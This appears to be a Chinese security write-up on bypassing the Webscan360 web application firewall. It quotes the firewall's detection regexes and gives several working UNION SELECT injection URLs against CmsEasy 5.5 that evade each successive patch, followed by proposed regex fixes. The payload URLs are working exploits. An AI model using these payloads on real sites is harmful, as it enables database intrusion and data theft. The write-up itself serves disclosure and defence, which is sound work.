# Webscan360的防御与绕过

这两天给360做了一个webscan360的总结，结果补丁还没有出来，就被人公布到了91org上面，既然公开了，那我就做一个总结

首先我们贴上它最新的防御正则

```
\<.+javascript:window\[.{1}\\x|<.*=(&#\d+?;?)+?>|<.*(data|src)=data:text\/html.*>|\b(alert\(|confirm\(|expression\(|prompt\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\()|<[a-z]+?\b[^>]*?\bon([a-z]{4,})\s*?=|^\+\/v(8|9)|\b(and|or)\b\s*?([\(\)'"\d]+?=[\(\)'"\d]+?|[\(\)'"a-zA-Z]+?=[\(\)'"a-zA-Z]+?|>|<|\s+?[\w]+?\s+?\bin\b\s*?\(|\blike\b\s+?["'])|\/\*.*\*\/|<\s*script\b|\bEXEC\b|UNION.+?SELECT@{0,2}(\(.+\)|\s+?.+?|(`|'|").*?(`|'|"))|UPDATE@{0,2}(\(.+\)|\s+?.+?|(`|'|").*?(`|'|"))SET|INSERT\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\(.+\)|\s+?.+?\s+?|(`|'|").*?(`|'|"))FROM(\(.+\)|\s+?.+?|(`|'|").*?(`|'|"))|(CREATE|ALTER|DROP|TRUNCATE)\s+(TABLE|DATABASE)|\/\*.*?\*\/|'

```

首先我们追溯一下：

方开始的时候并没有这个正则表达式`\/\*.*?\*\/|'`

所以当时我们可以写为：

```
union select/**/1,2,3

```

这里我们用cmseasy举例子

我们发送url：

```
http://192.168.10.70/CmsEasy_5.5_UTF-8_20141015/uploads/index.php?case=archive&act=orders&aid[typeid%60%3d1%20UNION%20SELECT/**/1,2,3,concat(version(),user()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58 from cmseasy_archive ORDER BY 1%23]=1

```

这时候我们是完全可以取出来敏感信息，成功绕过：

![enter image description here](http://drops.javaweb.org/uploads/images/1c5ecd48ef63065e457ed6e2deac8e40bcc3759b.jpg)

第二次被修补之后加上了后面的正则表达式，导致通篇不能写/**/这样的字符，但是这样真的能防御住吗：

我们利用mysql的一个特性：

```
union select`colum`,2,3 

```

这种特性是完全可以执行的

所以我们改变一下思路发送url:

```
http://192.168.10.70/CmsEasy_5.5_UTF-8_20141015/uploads/index.php?case=archive&act=orders&aid[typeid%60%3d1%20UNION%20SELECT`typeid`,2,3,concat(version(),user()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58 from cmseasy_archive ORDER BY 1%23]=1

```

这样就成功绕过了：

![enter image description here](http://drops.javaweb.org/uploads/images/40cfc05b6f42fcfc1c17e300a0ab55606b5f711e.jpg)

修补之后：

```
union select`colum`,2,3 

```

这种被正则`(`|'|").*?(`|'|")`这个给过滤了

下载下来之后，发现正则表达式

```
(\(.+\)|\s+?.+?|(`|'|").*?(`|'|"))

```

发现这是后修补了小引号，但是本质问题还是没有变

在sql中我们还有另外一个特性：

```
union select@`1`,2,3

```

这样也是可以执行，那么就成功绕过了：

所以我们改变一下思路发送url:

```
http://192.168.10.70/CmsEasy_5.5_UTF-8_20141015/uploads/index.php?case=archive&act=orders&aid[typeid%60%3d1%20UNION%20SELECT@`typeid`,2,3,concat(version(),user()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58 from cmseasy_archive ORDER BY 1%23]=1

```

![enter image description here](http://drops.javaweb.org/uploads/images/e35e6de690f0749d6feb6166120cf337aecdf07c.jpg)

此时有打了补丁，这时候正则又变成了

```
@{0,2}(.+|\(.+\)|\s+?.+?|(`|'|").*?(`|'|"))

```

这个正则的意思修补了刚才的那种类型，但是这个正则真正鸡肋的地方在如果不接小引号，那么这个正则就失效了

所以我们可以在进行变形处理`unionselect@1,2,3`这种没有被过滤，直接可以通过 这种形式的是可以在sql语句里面运行的，而且不报错

`unionselect@1=@1,2,3`这种也是没有被过滤，直接可以通过，这种也是可以再mysql完美执行的

发送url:

```
http://192.168.10.70/CmsEasy_5.5_UTF-8_20141015/uploads/ index.php?case=archive&act=orders&aid[typeid%60%3d1%20UNION%20SELECT@typeid,2,3,concat(version(),user()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58 from cmseasy_archive ORDER BY 1%23]=10

```

![enter image description here](http://drops.javaweb.org/uploads/images/ce4645b342ee26899b81e0fd73b804d555e71a63.jpg)

以上就是webscan360的进化，那么我们来分析一下怎么去修补这个漏洞

最后我们给出来的正则

```
@{0,2}(.+|\(.+\)|\s+?.+?|(`|'|").*?(`|'|"))

```

然后进行测试 成功的拦截了 union select类型的 当然了后面的update类型的 和 insert 类型也要进行相应的改进

下来让我们在看其他地方一个正则

```
INSERT\s+INTO.+?VALUES

```

这个是太传统的写法 其实根据mysql的写法 这个会拦截`insert into t values(1,2,3)`但是插入操作不止是这样的写法`insert into t set a=1`这个是不会被拦截的 所以还得加上一个正则

`INSERT\s+INTO.+?(VALUES|SET)`